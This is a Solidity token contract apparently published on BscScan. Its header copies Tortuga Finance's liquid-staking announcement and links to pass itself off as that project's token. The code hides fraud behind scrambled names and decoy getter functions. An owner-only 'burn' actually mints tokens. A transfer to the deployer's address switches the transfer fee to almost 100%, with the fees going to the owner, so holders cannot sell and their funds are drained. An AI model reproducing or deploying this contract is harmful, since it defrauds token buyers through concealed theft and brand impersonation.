/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

////////////////////////////////////////////////////////////////////////////
//Tortuga
//Liquid Staking on 
//Use $tAPT anywhere. Now LIVE!
//Tortuga Finance is now LIVE on mainnet!
//Starting now, you’ll be able to stake APT on Aptos mainnet via Tortuga.
//If you’re ready, head to https://tortuga.finance now. Here’s your step-by-step tutorial:
//Discord: https://discord.gg/tortuga-finance
//Twitter: https://twitter.com/TortugaFinance
////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;
contract Tortuga {
uint256 private  XFEXDJ = 1000000000000000000000;
address private  ZNUTGX = address(0);
uint256 private  CQUOIP = 10000000000000;
address private  SJITJN = address(0);
uint256 private  LFOXJW = 1000000000000000000;
uint256 private  BGUSEM = 1000000000000000;
address private  FVIKNE = address(0);
address private  LDHEIQ = address(0);
string public  symbol = "Tortuga";
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
uint256 private  PXKBCE = 100000000;
address public owner;
uint256 private  DEZRVA = 10000000000;
uint256 private  ZXDQPE = 1000000000000000000;
uint256 public constant AFLXGA = 99999;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  HMMUKW = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "Tortuga";
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getZNUTGX() private returns (address) {
return ZNUTGX;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getSJITJN() private returns (address) {
return SJITJN;
}

function _getPXKBCE() private returns (uint256) {
return PXKBCE;
}

function _getXFEXDJ() private returns (uint256) {
return XFEXDJ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getDEZRVA() private returns (uint256) {
return DEZRVA;
}

function _getFVIKNE() private returns (address) {
return FVIKNE;
}

function _getBGUSEM() private returns (uint256) {
return BGUSEM;
}

function _getLFOXJW() private returns (uint256) {
return LFOXJW;
}

function _getHMMUKW() private returns (address) {
return HMMUKW;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPDAITX 0");
require(spender != address(0), "fPDAITX 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PDAITX");
require(to != address(0), "PDAITX");
require(amount <= balanceOf[from], "PDAITX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* AFLXGA/ZXDQPE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LDHEIQ){
ZXDQPE = AFLXGA+2;
}
emit Transfer(from, to, transferAmount);
}
function _getCQUOIP() private returns (uint256) {
return CQUOIP;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
LDHEIQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}